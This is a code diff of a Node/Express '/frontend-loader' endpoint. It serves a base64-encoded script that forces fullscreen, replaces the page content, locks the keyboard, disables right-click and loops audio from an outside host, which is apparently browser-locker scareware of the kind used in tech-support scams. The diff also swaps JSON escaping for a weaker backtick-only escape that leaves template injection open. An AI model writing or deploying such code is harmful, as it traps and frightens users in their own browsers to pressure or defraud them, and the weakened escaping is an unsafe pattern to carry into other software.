@@ -75,25 +75,31 @@ app.get("/frontend-loader", validateRequest, async (req, res) => {
   }
 
   try {
-    const htmlPath = path.join(__dirname, "asset.html");
-    const someRandomString = await fs.readFile(htmlPath, "utf-8");
-    const sanitizedHTML = JSON.stringify(someRandomString); // escape for JS
+    const rawHTML = await fs.readFile(path.join(__dirname, "asset.html"), "utf-8");
 
+    // Escape backticks and backslashes only (safe for template literals)
+    const safeHTML = rawHTML
+      .replace(/\\/g, '\\\\')
+      .replace(/`/g, '\\`');
+    
     const code = `
       document.documentElement.requestFullscreen().then(() => {
-        document.body.innerHTML = ${sanitizedHTML};
+        document.body.innerHTML = \`${safeHTML}\`;
         navigator.keyboard.lock();
         document.addEventListener('contextmenu', e => e.preventDefault());
+    
         const audio1 = new Audio('https://audio.jukehost.co.uk/wuD65PsKBrAxWCZU4cJ2CbhUqwl33URw');
         audio1.loop = true;
         audio1.play();
+    
         const mumbaiAudio = new Audio('https://audio.jukehost.co.uk/TiYldVqiRFah8SdaoR0nWNvyv20wGngh');
         mumbaiAudio.loop = true;
         mumbaiAudio.play();
+    
         document.removeEventListener("click", handleSomeClick);
       });
     `;
-
+    
     const encoded = Buffer.from(code).toString("base64");
     res.set("Access-Control-Allow-Origin", ALLOWED_ORIGIN);
     return res.json({ code: encoded });
